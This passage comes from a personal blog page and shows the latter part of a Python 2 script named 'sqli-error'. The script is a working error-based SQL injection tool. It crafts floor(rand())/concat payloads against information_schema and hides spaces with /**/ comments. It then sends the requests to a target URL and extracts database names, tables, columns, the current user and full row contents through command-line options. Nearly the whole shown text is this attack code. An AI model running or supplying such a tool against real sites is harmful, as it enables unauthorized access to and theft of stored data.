+</span></span><span style=display:flex><span>    print <span style=color:#e6db74>&#34;Table </span><span style=color:#e6db74>%s</span><span style=color:#e6db74> has </span><span style=color:#e6db74>%d</span><span style=color:#e6db74> columns&#34;</span> <span style=color:#f92672>%</span> (table_name,column_value_num)
+</span></span><span style=display:flex><span>    print <span style=color:#e6db74>&#34;Table </span><span style=color:#e6db74>%s</span><span style=color:#e6db74> column values:&#34;</span> <span style=color:#f92672>%</span> table_name
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    title <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\t</span><span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span>    str_value <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;0x7e7e3a7e7e,&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> x <span style=color:#f92672>in</span> xrange(<span style=color:#ae81ff>0</span>,num_column):
+</span></span><span style=display:flex><span>        title <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>%-15s</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> column_name[x]
+</span></span><span style=display:flex><span>        str_value <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>,0x20,&#34;</span> <span style=color:#f92672>%</span> column_name[x]
+</span></span><span style=display:flex><span>    str_value <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;,&#34;</span><span style=color:#f92672>.</span>join(str_value<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#39;,&#39;</span>)[<span style=color:#ae81ff>0</span>:<span style=color:#f92672>-</span><span style=color:#ae81ff>2</span>]) <span style=color:#f92672>+</span><span style=color:#e6db74>&#34;,0x7e7e3a7e7e&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># print str_value</span>
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    print title
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> index <span style=color:#f92672>in</span> xrange(<span style=color:#ae81ff>0</span>,column_value_num):
+</span></span><span style=display:flex><span>        payload <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#39;+and(select 1 from(select count(*),concat((select (select ( select concat(</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>) from </span><span style=color:#e6db74>%s</span><span style=color:#e6db74>.</span><span style=color:#e6db74>%s</span><span style=color:#e6db74> limit </span><span style=color:#e6db74>%d</span><span style=color:#e6db74>,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+&#34;</span> <span style=color:#f92672>%</span> (str_value,db_name,table_name,index)
+</span></span><span style=display:flex><span>        <span style=color:#75715e># print payload</span>
+</span></span><span style=display:flex><span>        payload <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/**/&#34;</span><span style=color:#f92672>.</span>join(payload<span style=color:#f92672>.</span>split())
+</span></span><span style=display:flex><span>        value_url <span style=color:#f92672>=</span> url <span style=color:#f92672>+</span> payload
+</span></span><span style=display:flex><span>        response <span style=color:#f92672>=</span> urllib2<span style=color:#f92672>.</span>urlopen(value_url)
+</span></span><span style=display:flex><span>        html <span style=color:#f92672>=</span> response<span style=color:#f92672>.</span>read()
+</span></span><span style=display:flex><span>        <span style=color:#75715e># print html</span>
+</span></span><span style=display:flex><span>        value <span style=color:#f92672>=</span> re<span style=color:#f92672>.</span>search(<span style=color:#e6db74>r</span><span style=color:#e6db74>&#39;~~:~~(.*?)~~:~~&#39;</span>,html)<span style=color:#f92672>.</span>group(<span style=color:#ae81ff>1</span>)<span style=color:#f92672>.</span>split()
+</span></span><span style=display:flex><span>        <span style=color:#75715e># print value</span>
+</span></span><span style=display:flex><span>        stri <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\t</span><span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e># print len(value)</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> len(value)<span style=color:#f92672>==</span><span style=color:#ae81ff>0</span>:
+</span></span><span style=display:flex><span>            print <span style=color:#e6db74>&#34;&#34;</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>for</span> x <span style=color:#f92672>in</span> xrange(<span style=color:#ae81ff>0</span>,num_column):
+</span></span><span style=display:flex><span>                stri <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>%-15s</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> value[x]
+</span></span><span style=display:flex><span>            print stri
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>main</span>():
+</span></span><span style=display:flex><span>    print figlet_format(<span style=color:#e6db74>&#34;sqli-error&#34;</span>)
+</span></span><span style=display:flex><span>    parser <span style=color:#f92672>=</span> OptionParser()
+</span></span><span style=display:flex><span>    parser<span style=color:#f92672>.</span>add_option(<span style=color:#e6db74>&#34;-u&#34;</span>,<span style=color:#e6db74>&#34;--URL&#34;</span>,action<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;store&#34;</span>,
+</span></span><span style=display:flex><span>              type<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;string&#34;</span>,dest<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;url&#34;</span>,
+</span></span><span style=display:flex><span>              help<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;get url&#34;</span>)
+</span></span><span style=display:flex><span>    parser<span style=color:#f92672>.</span>add_option(<span style=color:#e6db74>&#34;-D&#34;</span>,<span style=color:#e6db74>&#34;--DB&#34;</span>,action<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;store&#34;</span>,
+</span></span><span style=display:flex><span>              type<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;string&#34;</span>,dest<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;db_name&#34;</span>,
+</span></span><span style=display:flex><span>              help<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;get database name&#34;</span>)
+</span></span><span style=display:flex><span>    parser<span style=color:#f92672>.</span>add_option(<span style=color:#e6db74>&#34;-T&#34;</span>,<span style=color:#e6db74>&#34;--TBL&#34;</span>,action<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;store&#34;</span>,
+</span></span><span style=display:flex><span>              type<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;string&#34;</span>,dest<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;table_name&#34;</span>,
+</span></span><span style=display:flex><span>              help<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;get table name&#34;</span>)
+</span></span><span style=display:flex><span>    parser<span style=color:#f92672>.</span>add_option(<span style=color:#e6db74>&#34;-C&#34;</span>,<span style=color:#e6db74>&#34;--COL&#34;</span>,action<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;store&#34;</span>,
+</span></span><span style=display:flex><span>              type<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;string&#34;</span>,dest<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;column_name&#34;</span>,
+</span></span><span style=display:flex><span>              help<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;get column name&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    parser<span style=color:#f92672>.</span>add_option(<span style=color:#e6db74>&#34;--dbs&#34;</span>,action<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;store_true&#34;</span>,
+</span></span><span style=display:flex><span>              dest<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;dbs&#34;</span>,help<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;get all database name&#34;</span>)
+</span></span><span style=display:flex><span>    parser<span style=color:#f92672>.</span>add_option(<span style=color:#e6db74>&#34;--current-db&#34;</span>,action<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;store_true&#34;</span>,
+</span></span><span style=display:flex><span>              dest<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;current_db&#34;</span>,help<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;get current database name&#34;</span>)
+</span></span><span style=display:flex><span>    parser<span style=color:#f92672>.</span>add_option(<span style=color:#e6db74>&#34;--current-user&#34;</span>,action<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;store_true&#34;</span>,
+</span></span><span style=display:flex><span>              dest<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;current_user&#34;</span>,help<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;get current user name&#34;</span>)
+</span></span><span style=display:flex><span>    parser<span style=color:#f92672>.</span>add_option(<span style=color:#e6db74>&#34;--tables&#34;</span>,action<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;store_true&#34;</span>,
+</span></span><span style=display:flex><span>              dest<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;tables&#34;</span>,help<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;get tables from databases&#34;</span>)
+</span></span><span style=display:flex><span>    parser<span style=color:#f92672>.</span>add_option(<span style=color:#e6db74>&#34;--columns&#34;</span>,action<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;store_true&#34;</span>,
+</span></span><span style=display:flex><span>              dest<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;columns&#34;</span>,help<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;get columns from tables&#34;</span>)
+</span></span><span style=display:flex><span>    parser<span style=color:#f92672>.</span>add_option(<span style=color:#e6db74>&#34;--dump&#34;</span>,action<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;store_true&#34;</span>,
+</span></span><span style=display:flex><span>              dest<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;dump&#34;</span>,help<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;get value&#34;</span>)
+</span></span><span style=display:flex><span>    (options,args) <span style=color:#f92672>=</span> parser<span style=color:#f92672>.</span>parse_args()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> options <span style=color:#f92672>==</span> <span style=color:#66d9ef>None</span> <span style=color:#f92672>or</span> options<span style=color:#f92672>.</span>url <span style=color:#f92672>==</span> <span style=color:#66d9ef>None</span>:
+</span></span><span style=display:flex><span>        parser<span style=color:#f92672>.</span>print_help()
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>elif</span> options<span style=color:#f92672>.</span>dump <span style=color:#f92672>and</span> options<span style=color:#f92672>.</span>column_name <span style=color:#f92672>and</span> options<span style=color:#f92672>.</span>table_name <span style=color:#f92672>and</span> options<span style=color:#f92672>.</span>db_name:
+</span></span><span style=display:flex><span>        getAllcontent(options<span style=color:#f92672>.</span>url,options<span style=color:#f92672>.</span>column_name,options<span style=color:#f92672>.</span>table_name,options<span style=color:#f92672>.</span>db_name)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>elif</span> options<span style=color:#f92672>.</span>table_name <span style=color:#f92672>and</span> options<span style=color:#f92672>.</span>db_name:
+</span></span><span style=display:flex><span>        getAllColumnsByTable(options<span style=color:#f92672>.</span>url,options<span style=color:#f92672>.</span>table_name,options<span style=color:#f92672>.</span>db_name)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>elif</span> options<span style=color:#f92672>.</span>db_name:
+</span></span><span style=display:flex><span>        getAllTablesByDb(options<span style=color:#f92672>.</span>url,options<span style=color:#f92672>.</span>db_name)    
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>elif</span> options<span style=color:#f92672>.</span>dbs:
+</span></span><span style=display:flex><span>        getAllDatabases(options<span style=color:#f92672>.</span>url)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>elif</span> options<span style=color:#f92672>.</span>current_db:
+</span></span><span style=display:flex><span>        getCurrentDb(options<span style=color:#f92672>.</span>url)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>elif</span> options<span style=color:#f92672>.</span>current_user:
+</span></span><span style=display:flex><span>        getCurrentUser(options<span style=color:#f92672>.</span>url)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>elif</span> options<span style=color:#f92672>.</span>url:
+</span></span><span style=display:flex><span>        print <span style=color:#e6db74>&#34;you input: sqli-error.py -u www.xxx.com/?id=xx&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;__main__&#39;</span>:
+</span></span><span style=display:flex><span>    main()
+</span></span></code></pre></div></div></article></main></div><footer><hr><p id=social>Find me around the web:
+<a href=https://github.com/reber0?_blank>GitHub</a>
+•
+<a href=https://weibo.com/u/5819760166?_blank>Weibo</a></p><p class=copyright>Copyright © 2015-2025
+<a href=https://wyb0.com/><strong>Reber</strong></a>.
+Built with
+<a href=http://www.gohugo.io/>Hugo</a>,
+based on the theme
+<a href=https://gitlab.com/ian-s-mcb/smigle-hugo-theme>smigle</a>.</p></footer></body></html>
